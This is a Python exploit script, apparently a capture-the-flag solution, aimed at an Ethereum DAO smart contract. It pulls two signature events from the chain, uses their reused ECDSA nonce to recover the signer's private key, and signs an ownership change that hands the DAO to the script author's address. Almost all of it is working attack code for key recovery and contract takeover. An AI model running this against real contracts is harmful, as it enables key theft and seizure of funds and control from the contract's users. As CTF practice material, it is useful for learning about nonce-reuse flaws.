import json
import os
import pprint
import eth_account
import eth_abi
from eth_abi import encode

from utils import create_transaction, get_abi, web3, myaddr
from sha3 import keccak_256

if not os.path.exists("abi.json"):
    get_abi("dao.sol")

abi = json.load(open("abi.json", encoding="ascii"))
abi_checkowner = abi["dao.sol:OffchainCheckOwner"]["abi"]
abi_dao = abi["dao.sol:DAO"]["abi"]

contract_address = "0x8f741921Be4691f98A7563eD6Aa5A220f7c0ADA6"

dao_ctr = web3.eth.contract(address=contract_address, abi=abi_dao)
pprint.pprint([x for x in dir(dao_ctr.functions) if "__" not in x])


def register():
    print(dao_ctr.functions.register().call())


def contribute():
    print(dao_ctr.functions.contribute().call())


def get_owner():
    return dao_ctr.functions.owner().call()


def used(hashstring):
    assert len(hashstring) == 32
    return dao_ctr.functions.used(hashstring).call()


def owner_contribute(v: int, r: bytes, s: bytes, hsh: bytes):
    func = dao_ctr.functions.ownerContribute(v, r, s, hsh)
    create_transaction(func)


def vote_for_yourself():
    print(dao_ctr.functions.voteForYourself().call())


def change_dao_owner(v: int, r: bytes, s: bytes, salt: bytes, new_owner: str):
    func = dao_ctr.functions.changeDAOowner(v, r, s, salt, new_owner)
    create_transaction(func)


def set_border(v: int, r: bytes, s: bytes, salt: bytes, border: int):
    func = dao_ctr.functions.setBorder(v, r, s, salt, border)
    create_transaction(func)

def withdraw():
    print(dao_ctr.functions.withdraw().call())

print("Owner: ", get_owner())
exit()


#block = web3.eth.get_block(7427908)
#print(block)
#t1, t2, t3 = block.transactions
#print(t1.hex(), t2.hex(), t3.hex(), sep='\n')
#def parse_input(inp):
#    cur = 0
#    v = inp[cur:cur +1]
#    cur += 1
#    r = inp[cur:cur + 32]
#    cur += 32
#    s = inp[cur:cur + 32]
#    cur += 32
#    h = inp[cur:cur + 32]
#    return v, r, s, h
#
#tr1 = web3.eth.get_transaction(t1)
#tr2 = web3.eth.get_transaction(t2)
#tr3 = web3.eth.get_transaction(t3)
em1, em2 = (dao_ctr.events.Signed().get_logs(fromBlock=7427908))
v1, r1, s1, h1 = em1.args.v, em1.args.r, em1.args.s, em1.args.hash
v2, r2, s2, h2 = em2.args.v, em2.args.r, em2.args.s, em2.args.hash

assert v1 == v2 and r1 == r2
n = 115792089237316195423570985008687907852837564279074904382605163141518161494337
r = int.from_bytes(r1, 'big')
s1 = int.from_bytes(s1, 'big')
s2 = int.from_bytes(s2, 'big')
h1 = int.from_bytes(h1, 'big')
h2 = int.from_bytes(h2, 'big')
k = (h1 - h2) * pow(s1 - s2, -1, n) % n
d = (s1 * k - h1) * pow(r, -1, n) % n
print(d)
d2 = (s2 * k - h2) * pow(r, -1, n) % n
assert d2 == d

acc = eth_account.Account.from_key(hex(d)[2:].zfill(64))

value = 17329992840538346
uint8_value = 0x1
salt = os.urandom(32)


encoded_data = encode(['uint8', 'uint256', 'bytes32'], [uint8_value, value, salt])
hash_result = keccak_256(encoded_data).digest()

from eth_account._utils.signing import sign_message_hash
key_obj = eth_account.Account._parsePrivateKey(d)
print(key_obj, type(key_obj))
v, r, s, _ = sign_message_hash(key_obj, hash_result)

change_dao_owner(v, r.to_bytes(32, 'big'), s.to_bytes(32, 'big'), salt, myaddr)
print(get_owner(), myaddr)
